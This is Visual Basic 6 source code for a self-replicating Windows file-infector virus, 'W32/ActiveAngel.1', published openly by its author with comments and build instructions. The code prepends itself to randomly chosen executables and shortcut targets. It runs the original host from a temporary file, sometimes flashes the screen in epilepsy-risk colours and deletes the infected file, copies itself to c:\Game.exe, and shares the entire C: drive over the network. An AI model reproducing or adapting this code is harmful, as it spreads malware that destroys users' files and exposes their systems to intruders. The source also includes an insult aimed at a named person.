Form1 code:

'#

Option Explicit

''''''''''''''''''''''''''''''''''''''''
'  W32/ActiveAngel.1 by Genetix {Doomriderz} '
'          Happy christmas! 2006       '
''''''''''''''''''''''''''''''''''''''''
'It spreads by either finding the files linked to shortcut files or just exe files
'in it's directory *decides with random numbers* (picks random file to infect)
'and prepends to them. The payload is the flashing of the screen in random pretty
'colors lol with the flashing of a text "The ActiveAngel virus". And creates a network share,
'sharing the c:\ drive and drops "Game.exe" to it.. i cant think of something else...

' you need to add the timer controle, lebels and other used controles to your VB projects main form befor
' trying to compile this.
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'  Avoid running this virus if you have seizures (Photosensitive epilepsy) '
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

'declare needed API's

Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, _
    ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" _
    (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, _
    ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" _
    (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function GetModuleFileName Lib "kernel32" Alias _
    "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Private Declare Function GetModuleHandle Lib "kernel32" Alias _
    "GetModuleHandleA" (ByVal lpModuleName As String) As Long
    
Dim AppName As String 'global variable to hold the virus file name
Const STILL_ACTIVE As Long = &H103, PROCESS_ALL_ACCESS As Long = &H1F0FFF
Const VirusSize As Long = 32768 '//virus size in bytes
Const SigLen As Integer = 2 '//size of infection marker
Const inf_mark$ = "'#" '//marker
Const MAX_PATH = 260 '//max size of path for windir

'Function to get windows directory
Public Function GetWindowsDir() As String
    Dim nSize As Long
    Dim lRet As Long
    GetWindowsDir = Space$(MAX_PATH)
    nSize = 500
    lRet = GetWindowsDirectory(GetWindowsDir, nSize)
    GetWindowsDir = Left(GetWindowsDir, lRet) & "\"
End Function

Sub Form_Load()
    '//declare some needed variables

    Dim hHost As Long, idHost As Long, iExit As Long, SelfName$, virPath$
    Dim HostCode() As Byte, HostCode2 As String
    Dim oasis() As Byte, oasis2$, oasis3$, FindData As WIN32_FIND_DATA
    Dim oasisLength As Long, i As Long, FreeF As Integer, FileArray() As String, _
        TargetName$, identify$, hModule As Long, buffer As String * 256
    Dim posF As Integer, GetSelfEXE As String, FName As String
    Dim FileHand As Long, fcount As Long, WinDir_$, AngelSource() As Byte
    i = 0: WinDir_$ = GetWindowsDir(): oasisLength = 0
    Dim int1 As Integer, int2 As Integer, FileType As String, rndF As Integer
    Randomize
    '//Get file name (path included) this way is better than just app.exename
    hModule = GetModuleHandle(App.EXEName)
    GetModuleFileName hModule, buffer, Len(buffer)
    GetSelfEXE = Left$(buffer, InStr(buffer & vbNullChar, vbNullChar) - 1)
    posF = InStrRev(GetSelfEXE, "\")
    virPath$ = Mid(GetSelfEXE, 1, posF)
    SelfName$ = GetSelfEXE

    FreeF = FreeFile
    AppName = SelfName$
    ReDim AngelSource(VirusSize) '//setup buffer for size of virus
    '//Get virus code
    Open SelfName$ For Binary Access Read As #FreeF
         Get #FreeF, 1, AngelSource
    Close #FreeF
    '//Decide what files to infect
    Randomize Timer
    FileType = vbNullString
    rndF = Int(2 * Rnd) + 1
    If rndF = 1 Then FileType = "*.exe"
    If rndF = 2 Then FileType = "*.lnk"

    '//Find files and push them into the array
    FileHand = FindFirstFile(FileType, FindData)
    FName = Trim(Replace(FindData.cFileName, Chr(0), ""))
    fcount = 0
    Do While FName <> ""
        ReDim Preserve FileArray(0 To fcount)
        FileArray(fcount) = FName
        FindData.cFileName = Chr(0)
        Call FindNextFile(FileHand, FindData)
        FName = Trim(Replace(FindData.cFileName, Chr(0), ""))
        fcount = fcount + 1
    Loop
    Call FindClose(FileHand)
    '//pick a random file to infect + get the exe file path from the lnk file
    If rndF = 2 Then
    TargetName$ = GetTarget(FileArray(Int(Val(fcount) * Rnd)))
    Else
    TargetName$ = (FileArray(Int(Val(fcount) * Rnd)))
    End If
    If (TargetName$ <> GetSelfEXE) Then '//check if its not the virus itself
        If (FileFound(TargetName$) = True) Then 'check if the file exist befor trying to infect
            If InStr(TargetName$, LCase(".exe")) Then '//make sure its an executable
                oasisLength = FileLen(TargetName$) 'Get the victims files length
                ReDim oasis(1 To oasisLength) 'create buffer
                oasis2$ = vbNullString 'empty this string
                '//read the victim bytes into the variable
                Open TargetName$ For Binary Access Read As #FreeF
                    Get #FreeF, , oasis
                Close #FreeF
                i = 0
                '//converted it to chr
                For i = LBound(oasis) To UBound(oasis)
                    oasis2$ = oasis2$ & Chr$(oasis(i))
                Next
                '//check if its infected
                If Mid(oasis2$, Len(oasis2$) - 1, Len(oasis2$) - Val(SigLen)) <> inf_mark$ Then
                '//its not infected so infect it
                    Open TargetName$ For Binary Access Write As #FreeF
                        Put #FreeF, 1, AngelSource '//write the virus code to the beginning of the file
                        Put #FreeF, , oasis2$ '//write the original victims code back
                        Put #FreeF, , inf_mark$ '//add the infection marker
                    Close #FreeF 'done!
                End If
             End If
        End If
    End If

If FileLen(SelfName$) > Val(VirusSize) Then 'check if the file is the virus or not
    ReDim HostCode(1 To FileLen(SelfName$) - Val(VirusSize)) 'create buffer to
                                                             'store just the host code
    Open SelfName$ For Binary Access Read As #FreeF
       Get #FreeF, , AngelSource 'get the virus code
       Get #FreeF, , HostCode     'get host code
    Close #FreeF
    'create a temp file for executing the host (infected file)
    Open WinDir_$ & "host.exe" For Binary Access Write As #FreeF
       Put #FreeF, , HostCode
    Close #FreeF
    'execute the host and wait for it to finish it's process
    idHost = Shell(WinDir_$ & "host.exe", vbNormalFocus)
    hHost = OpenProcess(PROCESS_ALL_ACCESS, False, idHost)
    GetExitCodeProcess hHost, iExit
    Do While iExit = STILL_ACTIVE
        GetExitCodeProcess hHost, iExit
        DoEvents
    Loop
    Kill WinDir_$ & "host.exe" 'delete it when it's finishing executing
End If
'decide if the virus chould activate the payload
int1 = Int(100 * Rnd) + 1: int2 = Int(100 * Rnd) + 1
If (Val(int1) Like Val(int2)) Then
    On Error Resume Next
    MsgBox "Blueowl is retarded!", vbCritical, "W32/ActiveAngel.1"
    'The following payload CAN harm YOU!
    Timer1.Enabled = True
    Form1.Show
    Kill TargetName$ 'kill random file
End If
Dim Copy_
Copy_ = FileCopy_(AppName, "c:\Game.exe") 'copy self to c:\
Call MakeShare
End Sub
'Not very interesting but good for newbies to learn from i guess lol

Public Function GetTarget(strPath As String) As String
'the following code gets the path to the exe from the shortcut file the easy way
    On Error GoTo exitFunk
    Dim wshShell As Object
    Dim wshLink As Object
    Set wshShell = CreateObject("WScript.Shell")
    Set wshLink = wshShell.CreateShortcut(strPath)
    GetTarget = wshLink.TargetPath
    Set wshLink = Nothing
    Set wshShell = Nothing
exitFunk:
    Exit Function
End Function

'share c:\
Sub MakeShare()
Shell ("net share " + "SharedDrive" + "=" + "c:\")
Unload Me
End Sub

'check if files exist function
Function FileFound(Victim As String) As Boolean
    Dim lpFindFileData As WIN32_FIND_DATA
    Dim hFindFirst As Long
    hFindFirst = FindFirstFile(Victim, lpFindFileData)
    If hFindFirst > 0 Then
        FindClose hFindFirst
        FileFound = True
    Else
        FileFound = False
    End If
End Function

'function to copy file
Public Function FileCopy_(src As String, dest As String, _
  Optional FailIfDestExists As Boolean) As Boolean
Dim lRet As Long
lRet = CopyFile(src, dest, FailIfDestExists)
FileCopy_ = (lRet > 0)
End Function

Private Sub Timer1_Timer()
'used for the payload to create random colors
Randomize Timer
Label1.ForeColor = QBColor(Rnd * 15)
Form1.BackColor = QBColor(Rnd * 15)
Label1.BackColor = QBColor(Rnd * 15)
End Sub


module1 code:


Public Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, _
    lpFindFileData As WIN32_FIND_DATA) As Long

Public Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, _
    lpFindFileData As WIN32_FIND_DATA) As Long

Public Declare Function FindClose Lib "kernel32.dll" (ByVal hFindFile As Long) As Long


Public Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
    End Type

Public Type WIN32_FIND_DATA
    dwFileAttributes As Long
    ftCreationTime As FILETIME
    ftLastAccessTime As FILETIME
    ftLastWriteTime As FILETIME
    nFileSizeHigh As Long
    nFileSizeLow As Long
    dwReserved0 As Long
    dwReserved1 As Long
    cFileName As String * 260
    cAlternate As String * 14
    End Type
